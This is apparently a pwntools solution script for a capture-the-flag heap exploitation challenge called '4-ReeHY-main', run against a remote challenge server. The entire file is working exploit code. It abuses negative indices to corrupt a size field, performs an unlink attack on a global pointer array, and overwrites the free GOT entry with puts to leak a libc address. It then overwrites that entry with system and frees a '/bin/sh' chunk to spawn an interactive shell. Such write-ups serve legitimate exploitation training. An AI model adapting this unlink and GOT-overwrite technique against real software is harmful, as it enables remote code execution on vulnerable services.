from pwn import *
context.log_level = "debug"
# p = process("./4-ReeHY-main")
p = remote("111.198.29.45" , 31110)

elf = ELF("./4-ReeHY-main")
# libc = ELF("./ctflibc.so.6")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

cmd = lambda c : p.sendlineafter("$ " , str(c))
def add(size , index , content):
	cmd(1)
	p.sendlineafter("Input size\n" , str(size))
	p.sendlineafter("Input cun\n" , str(index))
	p.sendafter("Input content\n" , content)

def delete(index):
	cmd(2)
	p.sendlineafter("Chose one to dele\n" , str(index))

def edit(index , content):
	cmd(3)
	p.sendlineafter("Chose one to edit" , str(index))
	p.sendafter("Input the content" , content)

p.sendlineafter("$ " , "fantasy")

normal_libc_addr = 0x00007ffff7a0d000
# malloc_hook_addr = normal_libc_addr + 0x3ba740
malloc_hook_addr = normal_libc_addr + 0x3c4b10
array_addr = 0x6020E0
# for heap overwrite
delete(-2) # delete size
add(0x14 , -2 , "a" * 5)
# unlink  + unsorted bin attack
# unlink for modify unsorted bin attack result
size = 0x80
add(size, 0 , "/bin/sh\x00")  # 1
add(size, 1 , "b")  # 2
add(size, 2 , "c")  # 3
add(size, 3 , "d")  # 4
add(size , 4 , "/bin/sh\x00") # 5
# 
edit(-2 , p32(0xffff) * 4)
payload = p64(0x0) + p64(size) + p64(array_addr + 8) + p64(array_addr + 0x10) 
payload = payload.ljust(size , "a") 
payload += p64(size) + p64(size + 0x10)

edit(2 , payload)
delete(3)   # 3
add(size , 3 , "d") # remove from unsorted bin  # 4
# unlink end
payload = p64(1) + p64(elf.got["free"]) + p64(1) 
edit(2 , payload)
edit(1 , p64(elf.plt["puts"] + 6))
payload = p64(1) + p64(elf.got["puts"]) + p64(1)  + p64(elf.got["free"]) + p64(1)
edit(2 , payload)
delete(1)
puts_addr = u64(p.recvuntil("\n" , drop=True).ljust(8 , "\x00"))
libc_base = puts_addr - libc.sym["puts"]
one_gadget = libc_base + 0xe1f4f
system = libc_base + libc.sym["system"]

edit(2 , p64(system))

delete(4)
p.interactive()
